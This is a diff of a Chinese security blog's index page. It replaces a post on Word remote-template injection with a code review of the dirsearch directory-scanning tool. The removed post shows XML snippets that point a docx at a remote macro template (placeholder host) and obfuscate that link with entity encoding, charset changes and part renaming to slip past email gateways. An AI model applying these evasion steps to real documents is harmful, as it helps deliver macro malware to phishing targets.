@@ -10,7 +10,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="turn1tup&#39;s blog">
-<meta property="og:url" content="https://turn1tup.github.io/page/3/index.html">
+<meta property="og:url" content="https://turn1tup.github.io/page/19/index.html">
 <meta property="og:site_name" content="turn1tup&#39;s blog">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="turn1tup">
@@ -152,61 +152,71 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-word远程模板文档混淆" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-读dirsearch有感" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/">word远程模板文档混淆</a>
+      <a class="article-title" href="/2019/03/01/%E8%AF%BBdirsearch%E6%9C%89%E6%84%9F/">读dirsearch有感</a>
     </h1>
   
 
         
-        <a href="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/" class="archive-article-date">
-  	<time datetime="2021-10-21T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-20</time>
+        <a href="/2019/03/01/%E8%AF%BBdirsearch%E6%9C%89%E6%84%9F/" class="archive-article-date">
+  	<time datetime="2019-03-02T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="远程模板及文档混淆"><a href="#远程模板及文档混淆" class="headerlink" title="远程模板及文档混淆"></a>远程模板及文档混淆</h1><p>通过远程模板的方式，我们可以使得邮件中发送的docx文档不直接带宏，对规避免杀有帮助。通常的手法是修改 <code>word/_rels/settings.xml.rels</code>中的relationship标签的Target值为远程的DOTM文档</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Relationships</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/relationships"</span>&gt;</span><span class="tag">&lt;<span class="name">Relationship</span> <span class="attr">Id</span>=<span class="string">"rId1"</span> <span class="attr">Type</span>=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"</span> <span class="attr">Target</span>=<span class="string">"https://xxx.xxx.xxx/xx.dotm"</span> <span class="attr">TargetMode</span>=<span class="string">"External"</span>/&gt;</span><span class="tag">&lt;/<span class="name">Relationships</span>&gt;</span></span><br></pre></td></tr></table></figure>
+        <h1 id="读dirsearch有感"><a href="#读dirsearch有感" class="headerlink" title="读dirsearch有感"></a>读dirsearch有感</h1><p>最近开始阅读一些优秀的开源项目，读完之后就顺手写写读后感吧，今天说说dirsearch，开头嘛，先读个简单点的，哈哈。</p>
+<h2 id="1-解决Debug"><a href="#1-解决Debug" class="headerlink" title="1.解决Debug"></a>1.解决Debug</h2><p>程序参数是从命令行获取的，而debug模式则是将一个py脚本作为程序入口的，笔者开始有点不知所措，突然临机一动，用下面这个代码不就解决了？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import dirsearch</span><br><span class="line">import sys</span><br><span class="line">sys.argv &#x3D; [&#39;dirsearch.py&#39;, &#39;-u&#39;, &#39;http:&#x2F;&#x2F;192.168.1.55&#39;, &#39;-e&#39;, &#39;jsp&#39;, &#39;--proxy&#39;, &#39;http:&#x2F;&#x2F;127.0.0.1:18080&#39;, &#39;-w&#39;, &#39;db&#x2F;dicc_test.txt&#39;]</span><br><span class="line">dirsearch.Program()</span><br></pre></td></tr></table></figure>
 
-<p>该手法总所周知，防护实体可能会检测Target这一字段，并对文档进行拦截，下面笔者说一下对文档的混淆思路，避免因远程模板特征直接被邮件网关拦截。</p>
-<h2 id="XML特性"><a href="#XML特性" class="headerlink" title="XML特性"></a>XML特性</h2><p>我们知道，在web漏洞利用时，payload为xml/soap时，我们可以利用其XML特性来bypass WAF，这里也同样适用。</p>
-<h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>编码脚本可以参考 <a href="https://github.com/turn1tup/scriptlet/blob/main/encoder.py" target="_blank" rel="noopener">https://github.com/turn1tup/scriptlet/blob/main/encoder.py</a></p>
-<p>针对<code>Target</code>值我们可以使用的编码方式：HTML-10进制、HTML-16进制、HTML畸形编码，对应<code>encoder.py</code>输出的 html_entity_data_decimal、html_entity_data_hex、html_entity_data_spe</p>
-<p><img src="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/encoder.png" alt></p>
-<p>使用HTML畸形编码我们可以获得如下文档：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;Relationships xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;package&#x2F;2006&#x2F;relationships&quot;&gt;&lt;Relationship Id&#x3D;&quot;rId1&quot; Type&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;relationships&#x2F;attachedTemplate&quot; Target&#x3D;&quot;&amp;#x0000068;&amp;#0000116;&amp;#x00074;&amp;#0000112;&amp;#x0000073;&amp;#00058;&amp;#x000002f;&amp;#0000047;&amp;#x00078;&amp;#000120;&amp;#x0000078;&amp;#000046;&amp;#x0000078;&amp;#00000120;&amp;#x000078;&amp;#000046;&amp;#x000078;&amp;#0000120;&amp;#x00078;&amp;#0000047;&amp;#x000078;&amp;#0000120;&amp;#x0002e;&amp;#0000100;&amp;#x0006f;&amp;#000116;&amp;#x000006d;&quot; TargetMode&#x3D;&quot;External&quot;&#x2F;&gt;&lt;&#x2F;Relationships&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="2-简说程序"><a href="#2-简说程序" class="headerlink" title="2.简说程序"></a>2.简说程序</h2><p>dirsearch是一款使用python3编写的，用于暴力破解目录的工具，其README有写到下面一点</p>
+<ul>
+<li>Heuristically detects invalid web pages（启发式地检测无效web页面）</li>
+</ul>
+<p>在读程序之前，我带着下面几点疑惑/好奇</p>
+<p>1.它是如果做到”启发式“这一点的；</p>
+<p>2.其线程方面的代码，是否有什么亮点；</p>
+<p>3.有啥比较骚的功能不。</p>
+<h3 id="2-1-dirsearch的启发式"><a href="#2-1-dirsearch的启发式" class="headerlink" title="2.1 dirsearch的启发式"></a>2.1 dirsearch的启发式</h3><p>从底层核心类开始说起。首先是Scanner，主要用于分析并存储当前网站对各类无效目录/无效文件真正的HTTP Resonse的模式。</p>
+<p>Scanner在测试时，使用的路径/文件是一个包含12个随机字符的字符串，如68yK0OccrHpt、68yK0OccrHpt.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.testPath &#x3D; RandomUtils.randString()</span><br></pre></td></tr></table></figure>
 
-<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>通过修改xml头部标签的<code>encoding</code>字符集声明，并转换xml文档为对应的字符集，我们可以混淆整个xml文档</p>
-<p>脚本参考 <a href="https://github.com/turn1tup/scriptlet/blob/main/charset_test.py" target="_blank" rel="noopener">https://github.com/turn1tup/scriptlet/blob/main/charset_test.py</a></p>
-<p>我们可以使用的字符集有 utf-16le 、utf-16be、utf-32le、utf-32be（另外微软的软件通常比较支持UTF-7，但这个字符集不好测试），在脚本中填入我们的 <code>settings.xml.rels</code>的原始内容，并修改<code>encoding</code>字段，运行脚本后使用获得的<code>setings.xml.rels</code>文件覆盖原始docx文档的 <code>word/rels/settings.xml/rels</code>文件即可。另外注意，我们使用记事本打开UTF16文档看到的内容与UTF8文档没有差异，但实际前者为后者2倍大小。</p>
-<p><img src="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/charset_test.png" alt></p>
-<h2 id="修改文档位置"><a href="#修改文档位置" class="headerlink" title="修改文档位置"></a>修改文档位置</h2><p><code>word/_rels/settings.xml.rels</code>的位置是可变动的</p>
-<p>一般使用远程模板加载DOTM手法时，修改的文件为word/rels/settings.xml.res</p>
-<p>我们可以修改为其他文件，过程如下：</p>
-<p>①修改<code>[Content_Types].xml</code>中的<code>/word/settings.xml</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Override PartName&#x3D;&quot;&#x2F;word&#x2F;settings.xml&quot; ContentType&#x3D;&quot;application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.settings+xml&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<p>有的网站系统，对请求无效WEB页面的HTTP Request，返回的是200的状态码，当然，界面是一个友好界面；有的网站则会返回一个301/302/307的跳转。</p>
+<p>当Scanner访问这些随机字符串路径时，如果服务器返回的状态码是404，则Scanner不继续分析，直接返回；服务器返回的状态码不是404，Scanner会发送第二次请求，依然是随机字符串的路径/文件，之后分析两次Response Body的相似度并保存该相似度的浮点值，如果两次Response都发生了跳转（301/302/307），那么还会为Location字段值（URL）生成一个正则，如下面所示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from difflib import SequenceMatcher</span><br><span class="line">import re</span><br><span class="line">def generateRedirectRegExp(firstLocation, secondLocation):</span><br><span class="line">    if firstLocation is None or secondLocation is None:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    sm &#x3D; SequenceMatcher(None, firstLocation, secondLocation)</span><br><span class="line">    marks &#x3D; []</span><br><span class="line"></span><br><span class="line">    for blocks in sm.get_matching_blocks():</span><br><span class="line">        i &#x3D; blocks[0]</span><br><span class="line">        n &#x3D; blocks[2]</span><br><span class="line">        # empty block</span><br><span class="line"></span><br><span class="line">        if n &#x3D;&#x3D; 0:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        mark &#x3D; firstLocation[i:i + n]</span><br><span class="line">        marks.append(mark)</span><br><span class="line"></span><br><span class="line">&gt;&gt;generateRedirectRegExp(&quot;http:&#x2F;&#x2F;www.test.com&quot;,&quot;http:&#x2F;&#x2F;123.test.com&quot;))</span><br><span class="line">&gt;&gt; ^.*http\:\&#x2F;\&#x2F;.*\.test\.com.*$</span><br></pre></td></tr></table></figure>
 
-<p>这里修改为<code>/word/foo.xml</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Override PartName&#x3D;&quot;&#x2F;word&#x2F;foo.xml&quot; ContentType&#x3D;&quot;application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.settings+xml&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<p>之后访问一个目录/文件时，发生跳转中的Location的值需要匹配该正则，也页面相似度不小于当前值时，该目录/文件才被认为是无效的。可以说，dirsearch在这里做得很细致啊。</p>
+<p>Scanner是被Fuzzer创建并调用的，Fuzzer为无后缀斜线目录（/dir）、有后缀斜线目录（/dir/）、用户指定扩展文件（/xx.php、/xx.jsp等）分别创建了一个Scanner，Scanner在执行setup()函数时，会如本节开头所说的，会分析出该种目录/文件的无效目录/无效文件所对应的HTTP Response的模式。</p>
+<h3 id="2-2-dirsearch的多线程"><a href="#2-2-dirsearch的多线程" class="headerlink" title="2.2 dirsearch的多线程"></a>2.2 dirsearch的多线程</h3><p>有人说dirsearch速度很快，笔者以为在多线程方面会有亮点，比如说用协程，但并没有啥亮点。</p>
+<p>虽然有GIL这东西然人感到不舒服，但也习惯了用threading，编写起来也快，笔者想着下一个项目还是得要求自己用用协程。</p>
+<h3 id="2-3-dirsearch的迭代遍历"><a href="#2-3-dirsearch的迭代遍历" class="headerlink" title="2.3 dirsearch的迭代遍历"></a>2.3 dirsearch的迭代遍历</h3><p>–recursive用于递归目录遍历，默认是关闭的，而设置该选项时，还可以设置–exclude-subdi排除不想做迭代的目录。</p>
+<p>在Controller中设置了matchCallbacks函数，该函数会将当前有效的不在exclude中的目录添加到当前</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.fuzzer &#x3D; Fuzzer(self.requester, self.dictionary, testFailPath&#x3D;self.arguments.testFailPath,</span><br><span class="line">                     threads&#x3D;self.arguments.threadsCount, matchCallbacks&#x3D;matchCallbacks,</span><br><span class="line">                     notFoundCallbacks&#x3D;notFoundCallbacks, errorCallbacks&#x3D;errorCallbacks)</span><br></pre></td></tr></table></figure>
 
+<p>在测试该功能时还发现了一个BUG，已经提交至Issues。问题的来源是这样的，Requester中有这样一行代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url &#x3D; urllib.parse.urljoin(url, self.basePath)</span><br></pre></td></tr></table></figure>
 
+<p>但是，这个urllib库者urljoin函数有点问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;from urllib import parse</span><br><span class="line">&gt;&gt;&gt;parse.urljoin(&quot;http:&#x2F;&#x2F;192.168.237.136&quot;,&quot;&#x2F;&#x2F;admin&#x2F;&quot;)</span><br><span class="line">&gt;&gt;&gt;&#39;http:&#x2F;&#x2F;admin&#x2F;&#39;</span><br></pre></td></tr></table></figure>
 
-<p>②同步修改的文件名称</p>
-<p><code>word/_rels/setting.xml</code> -&gt;<code>word/_rels/foo.xml</code> </p>
-<p><code>word/_rels/settings.xml.rels</code> -&gt;<code>word/_rels/foo.xml.rels</code></p>
-<p>③<code>word/rels/document.xml.rels</code>中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Relationship Id&#x3D;&quot;rId6&quot; Type&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;relationships&#x2F;settings&quot; Target&#x3D;&quot;setting.xml&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<p>笔者提交的修补代码是。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while True:</span><br><span class="line">	path_tmp &#x3D; self.basePath.replace(&#39;&#x2F;&#x2F;&#39;, &#39;&#x2F;&#39;)</span><br><span class="line">	if path_tmp &#x3D;&#x3D; self.basePath:</span><br><span class="line">		break</span><br><span class="line">	self.basePath &#x3D; path_tmp</span><br></pre></td></tr></table></figure>
 
-<p>修改为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Relationship Id&#x3D;&quot;rId6&quot; Type&#x3D;&quot;http:&#x2F;&#x2F;schemas.openxmlformats.org&#x2F;officeDocument&#x2F;2006&#x2F;relationships&#x2F;settings&quot; Target&#x3D;&quot;foo.xml&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
-
+<p>比较郁闷的一点时，dirsearch对待wordlist中结尾有“/”的，且该目录在当前目标URL中为有效时才会进行迭代遍历，比如</p>
+<p>访问<a href="http://www.test.com/admin" target="_blank" rel="noopener">http://www.test.com/admin</a> 时的 HTTP Response状态码为200 ，dirsearch不会对该目录进行迭代遍历，访问<a href="http://www.test.com/admin/" target="_blank" rel="noopener">http://www.test.com/admin/</a> 时的 HTTP Response 状态码200，dirsearch会对该目录进行迭代遍历。为啥要把选择权交给wordlist，作者为啥要做这种区分，吾不知所以然啊。</p>
+<h3 id="2-4-IP选项"><a href="#2-4-IP选项" class="headerlink" title="2.4 IP选项"></a>2.4 IP选项</h3><p>在渗透测试时，有时候做目录遍历时，不得不只能能用BurpSuit，不知道同学们对此是否有所体会。其中的痛点需求是，我们希望底层的Socket连接的是一个指定的IP，然后HTTP中的Host字段值则是另外一个指定的域名/IP。</p>
+<p>dirsearch就很巧妙地解决了以上痛点需求。requests传入的URL中的host值是来源于<code>-ip</code>,另外设置Headers中的<code>Host</code>字段值为–url中的值。</p>
+<h2 id="3-不足之处"><a href="#3-不足之处" class="headerlink" title="3.不足之处"></a>3.不足之处</h2><h3 id="3-1"><a href="#3-1" class="headerlink" title="3.1"></a>3.1</h3><p>笔者十分在意的另外一点是，dirsearch在扫目录时，没有主动区分”/dir”、“/dir/”，这两类目录（当然，前文也说了，作者把这两类作为是否迭代遍历的标志）。笔者的意思是，有时候，访问“<a href="http://www.test.com/admin%22%EF%BC%8CHTTP" target="_blank" rel="noopener">http://www.test.com/admin”，HTTP</a> Response状态码为301；访问“<a href="http://www.test.com/admin/%22%EF%BC%8CHTTP" target="_blank" rel="noopener">http://www.test.com/admin/“，HTTP</a> Response状态码为404。所以笔者十分在意这一点，这也是一个痛点啊，dirsearch并没有对此做一个主动性的区分。</p>
+<h3 id="3-2"><a href="#3-2" class="headerlink" title="3.2"></a>3.2</h3><p>还有一点可能有点吹毛求疵了，在读取字典时，不能将一个目录作为读入点。</p>
+<p>结尾，dirsearch的<code>启发式识别URL是否有效</code>确实挺不错的，可能是不同人有不同的想法，所以项目的一些地方会让笔者感到疑惑不解，而项目的整体逻辑也挺不错，适合像笔者这样的初学者好好看，好好学。本文也作为笔者的备忘录</p>
+<p><a href="https://turn1tup.github.io/2018/12/09/%E8%AF%BBdirsearch%E6%9C%89%E6%84%9F/">展开全文 &gt;&gt;</a></p>
 
       
 
@@ -219,7 +229,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/10/20/word%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%96%87%E6%A1%A3%E6%B7%B7%E6%B7%86/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/03/01/%E8%AF%BBdirsearch%E6%9C%89%E6%84%9F/">展开全文 >></a>
         </p>
       
 
@@ -251,7 +261,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/18/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="page-number" href="/page/18/">18</a><span class="page-number current">19</span><a class="page-number" href="/page/20/">20</a><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/20/">Next &amp;raquo;</a>
     </nav>
   
 
